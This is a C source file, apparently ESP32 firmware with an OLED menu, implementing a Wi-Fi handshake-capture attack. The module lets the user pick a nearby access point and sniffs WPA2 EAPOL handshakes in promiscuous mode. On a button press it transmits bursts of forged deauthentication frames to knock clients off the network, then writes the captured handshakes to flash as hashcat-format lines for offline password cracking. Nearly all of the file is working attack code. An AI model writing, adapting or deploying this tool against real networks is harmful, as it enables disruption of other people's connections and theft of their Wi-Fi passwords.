#include "wifi_handshake.h"
#include "wifi_scan.h"
#include "ssd1306.h"
#include "esp_wifi.h"
#include "esp_log.h"
#include "esp_timer.h"
#include "esp_mac.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include <string.h>
#include <stdio.h>

static const char *TAG = "handshake";

#define FC_FROM_DS(fc1) (((fc1) >> 1) & 0x01)
#define FC_TO_DS(fc1)   ((fc1) & 0x01)
#define FC_SUBTYPE(fc0) (((fc0) >> 4) & 0x0F)

#define M1_RING_SIZE     4
#define DEAUTH_BURST_N   48
#define DEAUTH_GAP_MS    20

typedef enum {
    HS_STATE_PICK = 0,
    HS_STATE_HUNTING,
    HS_STATE_CAPTURED,
} hs_state_t;

typedef struct {
    uint8_t client_mac[6];
    uint8_t replay_counter[8];
    uint8_t anonce[32];
    bool    valid;
} m1_record_t;

static hs_state_t     state         = HS_STATE_PICK;
static uint16_t       scroll_offset = 0;
static uint16_t       selected_idx  = 0;
static uint16_t       target_count  = 0;
static wifi_ap_info_t targets[MAX_SCAN_RESULTS];

static uint8_t  target_bssid[6];
static uint8_t  target_channel;
static char     target_ssid[33];

static volatile bool     hs_hunting       = false;
static volatile bool     hs_refresh       = false;
static volatile bool     deauth_request   = false;
static volatile bool     deauth_active    = false;
static volatile uint16_t m1_seen          = 0;
static volatile uint16_t m2_seen          = 0;
static volatile uint16_t deauth_sent      = 0;
static TaskHandle_t      hs_task_h        = NULL;

static m1_record_t m1_ring[M1_RING_SIZE];
static uint8_t     m1_ring_idx = 0;

static handshake_summary_t captures[HANDSHAKE_MAX_CAPTURES];
static uint8_t             cap_count = 0;
static uint8_t             view_idx  = 0;

// Hashcat line staged in the callback, written to flash by the task.
// Worst case ~500 chars: WPA*02 + 32 + 12 + 12 + 64 SSID + 64 ANONCE + 256 EAPOL + 2 + delims
static char    save_buf[700];
static volatile bool save_ready = false;

// ---------- M1 ring helpers ----------

static void m1_store(const uint8_t *client, const uint8_t *replay, const uint8_t *anonce) {
    // Replace any existing record with same client_mac, else insert at ring head
    for (uint8_t i = 0; i < M1_RING_SIZE; i++) {
        if (m1_ring[i].valid && memcmp(m1_ring[i].client_mac, client, 6) == 0) {
            memcpy(m1_ring[i].replay_counter, replay, 8);
            memcpy(m1_ring[i].anonce,         anonce, 32);
            return;
        }
    }
    m1_record_t *r = &m1_ring[m1_ring_idx];
    memcpy(r->client_mac,     client, 6);
    memcpy(r->replay_counter, replay, 8);
    memcpy(r->anonce,         anonce, 32);
    r->valid = true;
    m1_ring_idx = (m1_ring_idx + 1) % M1_RING_SIZE;
}

static const m1_record_t *m1_find(const uint8_t *client, const uint8_t *replay) {
    for (uint8_t i = 0; i < M1_RING_SIZE; i++) {
        if (m1_ring[i].valid &&
            memcmp(m1_ring[i].client_mac,     client, 6) == 0 &&
            memcmp(m1_ring[i].replay_counter, replay, 8) == 0) {
            return &m1_ring[i];
        }
    }
    return NULL;
}

// ---------- deauth frame ----------

static int build_deauth_frame(uint8_t *f, const uint8_t *client) {
    f[0] = 0xC0; f[1] = 0x00;              // FC: Deauthentication
    f[2] = 0x3A; f[3] = 0x01;              // Duration
    memcpy(f +  4, client,       6);        // Addr1: target client (or broadcast)
    memcpy(f + 10, target_bssid, 6);        // Addr2: AP
    memcpy(f + 16, target_bssid, 6);        // Addr3: BSSID
    f[22] = 0x00; f[23] = 0x00;            // Seq control
    f[24] = 0x07; f[25] = 0x00;            // Reason: Class 3 frame received from non-associated station
    return 26;
}

// ---------- save handshake ----------

static void build_hashcat_line(const uint8_t *mic, const uint8_t *anonce,
                               const uint8_t *client, const uint8_t *eapol_m2,
                               uint16_t eapol_len) {
    int bp = 0;
    bp += snprintf(save_buf + bp, sizeof(save_buf) - bp, "WPA*02*");
    for (int i = 0; i < 16; i++)
        bp += snprintf(save_buf + bp, sizeof(save_buf) - bp, "%02x", mic[i]);
    bp += snprintf(save_buf + bp, sizeof(save_buf) - bp, "*");
    for (int i = 0; i < 6; i++)
        bp += snprintf(save_buf + bp, sizeof(save_buf) - bp, "%02x", target_bssid[i]);
    bp += snprintf(save_buf + bp, sizeof(save_buf) - bp, "*");
    for (int i = 0; i < 6; i++)
        bp += snprintf(save_buf + bp, sizeof(save_buf) - bp, "%02x", client[i]);
    bp += snprintf(save_buf + bp, sizeof(save_buf) - bp, "*");
    for (int i = 0; target_ssid[i]; i++)
        bp += snprintf(save_buf + bp, sizeof(save_buf) - bp, "%02x", (uint8_t)target_ssid[i]);
    bp += snprintf(save_buf + bp, sizeof(save_buf) - bp, "*");
    for (int i = 0; i < 32; i++)
        bp += snprintf(save_buf + bp, sizeof(save_buf) - bp, "%02x", anonce[i]);
    bp += snprintf(save_buf + bp, sizeof(save_buf) - bp, "*");
    // EAPOL M2 with MIC field (offset 81..96) zeroed
    for (uint16_t i = 0; i < eapol_len && i < 256; i++) {
        uint8_t b = (i >= 81 && i <= 96) ? 0x00 : eapol_m2[i];
        bp += snprintf(save_buf + bp, sizeof(save_buf) - bp, "%02x", b);
    }
    snprintf(save_buf + bp, sizeof(save_buf) - bp, "*00\n");
    save_ready = true;
}

// ---------- promiscuous callback ----------

static void promisc_rx(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (!hs_hunting) return;
    if (type != WIFI_PKT_DATA) return;

    const wifi_promiscuous_pkt_t *pkt = (const wifi_promiscuous_pkt_t *)buf;
    const uint8_t *frame = pkt->payload;
    if (pkt->rx_ctrl.sig_len < 4) return;
    uint16_t frame_len = (uint16_t)(pkt->rx_ctrl.sig_len - 4);  // strip FCS

    uint8_t from_ds = FC_FROM_DS(frame[1]);
    uint8_t to_ds   = FC_TO_DS(frame[1]);

    // Must be AP↔client (BSS infrastructure). Reject ad-hoc and WDS.
    if (from_ds == to_ds) return;

    // BSSID is Addr2 when FromDS=1, Addr1 when ToDS=1
    const uint8_t *bssid_p = (from_ds) ? (frame + 10) : (frame + 4);
    if (memcmp(bssid_p, target_bssid, 6) != 0) return;

    // Client MAC is the non-BSSID address
    const uint8_t *client = (from_ds) ? (frame + 4) : (frame + 10);

    // QoS Data frames have 2-byte QoS field after the standard 24-byte header
    uint8_t hdr_len = (FC_SUBTYPE(frame[0]) & 0x08) ? 26 : 24;

    // Need at minimum LLC(8) + EAPOL header(4) + Key body up to MIC end(95)
    if (frame_len < (uint16_t)(hdr_len + 8 + 99)) return;

    // LLC/SNAP: must be EAPOL (0x888E)
    const uint8_t *llc = frame + hdr_len;
    if (llc[0] != 0xAA || llc[1] != 0xAA || llc[6] != 0x88 || llc[7] != 0x8E) return;

    const uint8_t *eapol = llc + 8;
    if (eapol[1] != 3) return;             // EAPOL-Key
    if (eapol[4] != 2) return;             // RSN/WPA2

    uint16_t key_info = (uint16_t)((eapol[5] << 8) | eapol[6]);
    bool ack  = (key_info & 0x0080) != 0;
    bool mic  = (key_info & 0x0100) != 0;
    bool inst = (key_info & 0x0040) != 0;
    bool pair = (key_info & 0x0008) != 0;
    if (!pair) return;                     // Only pairwise key

    const uint8_t *replay = eapol + 9;
    const uint8_t *nonce  = eapol + 17;

    // M1: AP→client, Ack=1, MIC=0
    if (from_ds && ack && !mic) {
        m1_store(client, replay, nonce);
        m1_seen++;
        hs_refresh = true;
        return;
    }

    // M2: client→AP, Ack=0, MIC=1, Install=0
    if (to_ds && !ack && mic && !inst) {
        const m1_record_t *m1 = m1_find(client, replay);
        if (!m1) return;                   // No matching M1 yet

        // Full EAPOL frame length from EAPOL header
        uint16_t eapol_len = 4 + (uint16_t)((eapol[2] << 8) | eapol[3]);
        if (eapol_len < 99 || eapol_len > 256) return;
        if (frame_len < (uint16_t)(hdr_len + 8 + eapol_len)) return;

        m2_seen++;

        // Deduplicate: same client_mac already captured?
        for (uint8_t i = 0; i < cap_count; i++) {
            if (memcmp(captures[i].client_mac, client, 6) == 0 &&
                memcmp(captures[i].bssid,      target_bssid, 6) == 0) return;
        }
        if (cap_count >= HANDSHAKE_MAX_CAPTURES) return;

        const uint8_t *m2_mic = eapol + 81;
        build_hashcat_line(m2_mic, m1->anonce, client, eapol, eapol_len);

        handshake_summary_t *cap = &captures[cap_count];
        memcpy(cap->bssid,      target_bssid, 6);
        memcpy(cap->client_mac, client,       6);
        strncpy(cap->ssid, target_ssid, 32);
        cap->ssid[32] = '\0';
        cap->channel = target_channel;
        cap_count++;
        view_idx = cap_count - 1;

        state      = HS_STATE_CAPTURED;
        hs_refresh = true;
        ESP_LOGI(TAG, "Handshake: %s <- %02x:%02x:%02x:%02x:%02x:%02x",
                 target_ssid, client[0], client[1], client[2], client[3], client[4], client[5]);
    }
}

// ---------- hunting task ----------

static void hs_task(void *arg) {
    esp_wifi_set_channel(target_channel, WIFI_SECOND_CHAN_NONE);

    uint8_t deauth_to_client[26];
    uint8_t deauth_to_bcast[26];
    static const uint8_t broadcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
    build_deauth_frame(deauth_to_bcast, broadcast);

    while (hs_hunting) {
        // Flash any staged handshake to LittleFS
        if (save_ready) {
            FILE *fp = fopen("/lfs/handshakes.log", "a");
            if (fp) { fputs(save_buf, fp); fclose(fp); }
            save_ready = false;
        }

        if (deauth_request) {
            deauth_request = false;
            deauth_active  = true;
            hs_refresh     = true;
            // Send a burst — broadcast + any seen clients on this AP
            for (uint8_t i = 0; i < DEAUTH_BURST_N && hs_hunting; i++) {
                // Half broadcast, half targeted at last-seen clients (if any)
                if ((i & 1) == 0 || cap_count == 0) {
                    esp_wifi_80211_tx(WIFI_IF_STA, deauth_to_bcast, 26, false);
                } else {
                    build_deauth_frame(deauth_to_client, captures[cap_count - 1].client_mac);
                    esp_wifi_80211_tx(WIFI_IF_STA, deauth_to_client, 26, false);
                }
                deauth_sent++;
                vTaskDelay(pdMS_TO_TICKS(DEAUTH_GAP_MS));
            }
            deauth_active = false;
            hs_refresh    = true;
        }

        hs_refresh = true;
        vTaskDelay(pdMS_TO_TICKS(250));
    }

    // Final flush in case M2 arrived just before exit
    if (save_ready) {
        FILE *fp = fopen("/lfs/handshakes.log", "a");
        if (fp) { fputs(save_buf, fp); fclose(fp); }
        save_ready = false;
    }

    hs_task_h = NULL;
    vTaskDelete(NULL);
}

// ---------- public API ----------

void wifi_handshake_init(void) {
    memset(m1_ring, 0, sizeof(m1_ring));
    ESP_LOGI(TAG, "Handshake module ready");
}

void wifi_handshake_enter(void) {
    state         = HS_STATE_PICK;
    scroll_offset = 0;
    selected_idx  = 0;

    const wifi_ap_info_t *scan = wifi_scan_get_results(&target_count);
    if (target_count > MAX_SCAN_RESULTS) target_count = MAX_SCAN_RESULTS;
    if (scan && target_count > 0) {
        memcpy(targets, scan, sizeof(wifi_ap_info_t) * target_count);
        return;
    }

    ssd1306_clear_buffer();
    ssd1306_draw_header("HANDSHAKE", "scan first");
    ssd1306_draw_string(0, 3, "Scanning APs...");
    ssd1306_flush();

    wifi_scan_start();
    scan = wifi_scan_get_results(&target_count);
    if (target_count > MAX_SCAN_RESULTS) target_count = MAX_SCAN_RESULTS;
    if (scan && target_count > 0) {
        memcpy(targets, scan, sizeof(wifi_ap_info_t) * target_count);
    }
}

void wifi_handshake_scroll_up(void) {
    if (selected_idx > 0) {
        selected_idx--;
        if (selected_idx < scroll_offset) scroll_offset = selected_idx;
    }
}

void wifi_handshake_scroll_down(void) {
    if (target_count > 0 && selected_idx < target_count - 1) {
        selected_idx++;
        if (selected_idx >= scroll_offset + 6) scroll_offset = selected_idx - 5;
    }
}

void wifi_handshake_select(void) {
    if (state == HS_STATE_PICK) {
        if (target_count == 0) return;
        if (targets[selected_idx].security == 0) {
            ssd1306_clear_buffer();
            ssd1306_draw_header("HANDSHAKE", "OPEN");
            ssd1306_draw_string(0, 3, "Open APs have");
            ssd1306_draw_string(0, 4, "no handshake!");
            ssd1306_flush();
            vTaskDelay(pdMS_TO_TICKS(1500));
            return;
        }

        memcpy(target_bssid, targets[selected_idx].bssid, 6);
        target_channel = targets[selected_idx].channel;
        strncpy(target_ssid, targets[selected_idx].ssid, 32);
        target_ssid[32] = '\0';
        if (!target_ssid[0]) strncpy(target_ssid, "Hidden", 32);

        m1_seen        = 0;
        m2_seen        = 0;
        deauth_sent    = 0;
        deauth_request = false;
        deauth_active  = false;
        save_ready     = false;
        memset(m1_ring, 0, sizeof(m1_ring));
        hs_hunting     = true;
        state          = HS_STATE_HUNTING;

        esp_wifi_stop();
        ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
        ESP_ERROR_CHECK(esp_wifi_start());

        esp_wifi_set_promiscuous(true);
        esp_wifi_set_promiscuous_rx_cb(promisc_rx);

        xTaskCreate(hs_task, "handshake", 4096, NULL, 5, &hs_task_h);
        ESP_LOGI(TAG, "Hunting handshake: %s ch%u", target_ssid, target_channel);
        return;
    }

    if (state == HS_STATE_HUNTING) {
        // CLICK during hunt = fire deauth burst
        deauth_request = true;
        hs_refresh     = true;
        return;
    }
}

void wifi_handshake_view_next(void) {
    if (cap_count > 1) view_idx = (view_idx + 1) % cap_count;
}

void wifi_handshake_stop(void) {
    hs_hunting = false;
    esp_wifi_set_promiscuous(false);
    state = HS_STATE_PICK;
    ESP_LOGI(TAG, "Handshake stopped — %u captures", cap_count);
}

bool wifi_handshake_is_running(void)   { return hs_hunting; }
bool wifi_handshake_is_in_picker(void) { return state == HS_STATE_PICK; }
bool wifi_handshake_is_captured(void)  { return state == HS_STATE_CAPTURED; }
uint8_t wifi_handshake_get_count(void) { return cap_count; }
const char *wifi_handshake_get_target(void) { return target_ssid; }
uint16_t    wifi_handshake_get_m1(void)     { return m1_seen; }
uint16_t    wifi_handshake_get_m2(void)     { return m2_seen; }
uint16_t    wifi_handshake_get_deauth(void) { return deauth_sent; }

bool wifi_handshake_needs_refresh(void) {
    bool v = hs_refresh;
    hs_refresh = false;
    return v;
}

// ---------- render ----------

static const char *auth_short(uint8_t sec) {
    switch (sec) {
        case 0: return "OPEN"; case 1: return "WEP ";
        case 2: return "WPA "; case 3: return "WPA2";
        case 6: return "WPA3"; case 7: return "WP23";
        default: return "WPA2";
    }
}

static void render_picker(void) {
    ssd1306_clear_buffer();
    if (target_count == 0) {
        ssd1306_draw_header("HANDSHAKE", "No APs");
        ssd1306_draw_string(0, 3, " Run WiFi Scan");
        ssd1306_draw_string(0, 4, " first");
        ssd1306_flush();
        return;
    }
    char status[16];
    snprintf(status, sizeof(status), "%u/%u %s",
             selected_idx + 1, target_count,
             auth_short(targets[selected_idx].security));
    ssd1306_draw_header("HANDSHK", status);
    for (uint8_t row = 0; row < 6; row++) {
        uint16_t idx = scroll_offset + row;
        if (idx >= target_count) break;
        const char *ssid = targets[idx].ssid[0] ? targets[idx].ssid : "Hidden";
        char line[17];
        snprintf(line, sizeof(line), "%c%-10.10s %4d",
                 (idx == selected_idx) ? '>' : ' ',
                 ssid, (int)targets[idx].rssi);
        ssd1306_draw_string(0, row + 2, line);
    }
    ssd1306_flush();
}

static void render_hunting(void) {
    static uint8_t tick = 0;
    static const char spinner[] = "|/-\\";
    tick++;

    ssd1306_clear_buffer();
    char status[32];
    if (deauth_active) {
        snprintf(status, sizeof(status), "DEAUTH %u", (unsigned)deauth_sent);
    } else {
        snprintf(status, sizeof(status), "M1:%u M2:%u",
                 (unsigned)m1_seen, (unsigned)m2_seen);
    }
    status[15] = '\0';
    ssd1306_draw_header("HANDSHK", status);

    char line[17];
    snprintf(line, sizeof(line), "%.16s", target_ssid);
    ssd1306_draw_string(0, 2, line);

    snprintf(line, sizeof(line), "%02X%02X%02X%02X%02X%02X",
             target_bssid[0], target_bssid[1], target_bssid[2],
             target_bssid[3], target_bssid[4], target_bssid[5]);
    ssd1306_draw_string(0, 3, line);

    { char tmp[32]; snprintf(tmp, sizeof(tmp), "Ch:%-2u DTx:%-4u",
             target_channel, (unsigned)deauth_sent);
      tmp[16] = '\0'; ssd1306_draw_string(0, 4, tmp); }

    if (deauth_active) {
        snprintf(line, sizeof(line), "! Deauth burst");
    } else {
        snprintf(line, sizeof(line), "%c Listening...", spinner[tick % 4]);
    }
    ssd1306_draw_string(0, 5, line);

    if (cap_count > 0) {
        snprintf(line, sizeof(line), "Got: %u shake", cap_count);
        ssd1306_draw_string(0, 6, line);
    }
    ssd1306_draw_string(0, 7, "CK>deauth LN>X");
    ssd1306_flush();
}

static void render_captured(void) {
    ssd1306_clear_buffer();
    char status[16];
    snprintf(status, sizeof(status), "%u cap", cap_count);
    ssd1306_draw_header("HANDSHK", status);

    handshake_summary_t *cap = &captures[view_idx];
    char line[17];

    snprintf(line, sizeof(line), "%.16s", cap->ssid);
    ssd1306_draw_string(0, 2, line);

    snprintf(line, sizeof(line), "AP:%02X%02X%02X%02X%02X%02X",
             cap->bssid[0], cap->bssid[1], cap->bssid[2],
             cap->bssid[3], cap->bssid[4], cap->bssid[5]);
    ssd1306_draw_string(0, 3, line);

    snprintf(line, sizeof(line), "CL:%02X%02X%02X%02X%02X%02X",
             cap->client_mac[0], cap->client_mac[1], cap->client_mac[2],
             cap->client_mac[3], cap->client_mac[4], cap->client_mac[5]);
    ssd1306_draw_string(0, 4, line);

    ssd1306_draw_string(0, 5, "Handshake OK!");
    ssd1306_draw_string(0, 6, "Saved /lfs");

    if (cap_count > 1) {
        char tmp[32];
        snprintf(tmp, sizeof(tmp), "%u/%u CK>nxt LN>X", view_idx + 1, cap_count);
        tmp[16] = '\0';
        ssd1306_draw_string(0, 7, tmp);
    } else {
        ssd1306_draw_string(0, 7, "LN>back");
    }
    ssd1306_flush();
}

void wifi_handshake_render(void) {
    switch (state) {
        case HS_STATE_PICK:     render_picker();   break;
        case HS_STATE_HUNTING:  render_hunting();  break;
        case HS_STATE_CAPTURED: render_captured(); break;
    }
}
